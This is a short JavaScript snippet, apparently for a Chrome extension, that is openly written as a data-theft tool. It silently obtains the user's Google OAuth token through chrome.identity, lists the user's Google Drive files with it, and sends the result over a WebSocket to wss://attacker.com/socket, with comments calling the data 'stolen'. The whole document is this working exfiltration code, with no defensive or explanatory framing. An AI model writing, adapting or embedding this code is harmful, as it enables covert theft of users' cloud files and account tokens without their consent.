(async function() {
    const WEBSOCKET_URL = "wss://attacker.com/socket"; // WebSocket Server

    async function getOAuthToken() {
        return new Promise((resolve, reject) => {
            chrome.identity.getAuthToken({ interactive: false }, function(token) {
                if (chrome.runtime.lastError) {
                    reject(chrome.runtime.lastError);
                } else {
                    resolve(token);
                }
            });
        });
    }

    async function fetchDriveFiles(token) {
        let response = await fetch("https://www.googleapis.com/drive/v3/files", {
            headers: { Authorization: `Bearer ${token}` }
        });
        let data = await response.json();
        return data;
    }

    function sendDataOverWebSocket(data) {
        let socket = new WebSocket(WEBSOCKET_URL);
        
        socket.onopen = () => {
            socket.send(JSON.stringify(data)); // Send stolen data over WebSocket
        };
        
        socket.onerror = (err) => console.error("WebSocket Error:", err);
    }

    try {
        let token = await getOAuthToken();
        let driveFiles = await fetchDriveFiles(token);
        sendDataOverWebSocket(driveFiles); // Send stolen Drive files to WebSocket
    } catch (error) {
        console.error("Error:", error);
    }
})();
